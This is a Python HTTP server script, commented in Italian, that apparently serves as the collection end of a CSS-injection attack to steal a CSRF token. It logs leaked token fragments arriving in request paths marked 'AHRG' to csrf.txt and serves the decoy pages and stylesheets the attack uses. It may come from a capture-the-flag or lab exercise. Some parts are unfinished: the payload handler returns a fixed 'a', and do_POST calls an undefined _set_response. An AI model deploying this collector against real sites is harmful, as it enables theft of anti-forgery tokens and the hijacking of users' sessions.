#!/usr/bin/env python3
"""

LEGGE I FAKE CSS E AGGIORNA IL FILE

"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import logging, time



class S(BaseHTTPRequestHandler):

  def do_GET(self):
        
    print('path', self.path)

    if 'AHRG' in self.path:
      self.send_response(200)
      self.send_header('Content-type', 'image/gif')
      self.end_headers()
      with open('csrf.txt', 'a') as csrf:
        print(f"crsf ({len(self.path[5:])}):", self.path[5:])
        csrf.write(self.path[5:])
      self.wfile.write(b'')
      
    elif self.path == "/":
      self.send_response(200)
      self.send_header('Content-type', 'text/html')
      self.end_headers()
      with open('index2.html', 'rb') as s:
        html = s.read()
      self.wfile.write(html)
        
      
    if self.path == '/include.css':
      self.send_response(200)
      self.send_header('Content-type', 'text/css')
      self.end_headers()
      with open('include.css', 'rb') as s:
        html = s.read()
      self.wfile.write(html)

    elif 'payload' in self.path:
      self.send_response(200)
      self.send_header('Content-type', 'text/css')
      self.end_headers()
      time.sleep(2)
      with open('csrf.txt', 'r') as csrf:
        print(csrf.read())
        css = "a"
      self.wfile.write(css.encode())

    else:
      self.send_response(200)
      self.send_header('Content-type', 'text/html')
      self.end_headers()
      with open('index.html', 'rb') as s:
        html = s.read()
      self.wfile.write(html)
      

  def do_POST(self):
      content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
      post_data = self.rfile.read(content_length) # <--- Gets the data itself
      logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
              str(self.path), str(self.headers), post_data.decode('utf-8'))

      self._set_response()
      self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))



def run(server_class=HTTPServer, handler_class=S, port=5001):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info(f'Starting http {"127.0.0.1"}:{port}\n')
    httpd.serve_forever()
    # try:
    #     httpd.serve_forever()
    # except KeyboardInterrupt:
    #     pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()